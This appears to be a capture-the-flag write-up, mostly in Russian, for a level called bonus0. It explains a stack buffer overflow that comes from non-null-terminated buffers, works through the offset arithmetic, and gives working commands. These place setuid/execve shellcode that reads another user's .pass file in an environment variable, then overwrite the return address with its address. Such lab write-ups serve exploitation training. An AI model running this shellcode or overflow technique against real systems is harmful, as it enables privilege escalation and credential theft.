Программа читает с ввода две строчки, затем выводит их через пробел.
Можно заметить, что какой бы длины ни была первая строчка, начиная с 21 символал,
она будет переписана второй.

Если посмотреть disas, то можно выяснить, что в main есть буфер, который передаётся функции pp. В функции pp есть
два буфера, которые передаются в функцию p, которая уже выполяется считывание. Причём, в переданный через аргументы
буфер p запишет только 20 символов. Кажется, что тут не обойти систему, но буферы не завершаются нулём.
Полученные в pp буферы записываются в буфер из мейна через пробел и выводятся.
Если первая строка будет длиннее 19 символов, то в конечном счёте в буфер в мейне длиной 42 символа запишется
первая введённая строка + вторая строка, пробел, вторая строка.
Получаем несложное уравнение 50 = 1 + 20 + 2x.
Упс, длина строки не может быть равна 19,5 символам.
Ладно, попробуем по-другому. Нужно 50 символов.
Hmm. Damn shit! I am so stupid for algebra. I'll just copy this address 4 times and will try to crack offset with 3 other symbols.
Nice! This option works fine!

export KEK=`python -c 'print "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus1/.pass"'`

cd /tmp && mkdir 1 && cd 1
echo 'int     main(void){printf(" %p\n", getenv("KEK"));}' > addr.c && gcc addr.c && ./a.out

(python -c 'print "A" * 20' ; python -c 'print "B" * 2 + "\x48\xff\xff\xbf" * 4  + "B" * 1') | /home/user/bonus0/bonus0
